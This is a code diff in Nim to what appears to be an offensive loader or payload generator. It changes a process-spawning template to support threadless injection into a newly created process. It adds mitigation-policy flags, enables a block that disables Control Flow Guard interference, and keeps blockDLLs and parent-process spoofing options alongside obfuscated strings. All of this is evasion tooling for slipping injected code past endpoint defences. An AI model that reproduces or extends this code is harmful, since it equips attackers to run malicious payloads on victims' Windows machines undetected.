@@ -3260,19 +3260,23 @@ let NotepadProcIDStub * = fmt"""
             else:
                 tProcPath = newWideCString(obf(r"{customspawnprocess}"))
 
-        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+        InitializeProcThreadAttributeList(NULL, 3, 0, addr lpSize)
         si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+        InitializeProcThreadAttributeList(si.lpAttributeList, 3, 0, addr lpSize)
 
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
 
             when defined(blockDLLs):
                 const
                     PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
+                    PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
                 var
                     policy: DWORD64
-
-                policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+                
+                if(cfgspawn):
+                    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON or PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
+                else:
+                    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                 
                 status = UpdateProcThreadAttribute(
                     si.lpAttributeList,
@@ -3308,7 +3312,7 @@ let NotepadProcIDStub * = fmt"""
         
         when defined(suspended): 
             flags = flags or CREATE_SUSPENDED
-        #[
+        
         if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
             
             var policy: DWORD64
@@ -3324,7 +3328,7 @@ let NotepadProcIDStub * = fmt"""
                 sizeof(policy),
                 NULL,
                 NULL)
-        ]#  
+          
 
         status = CreateProcess(
             NULL,
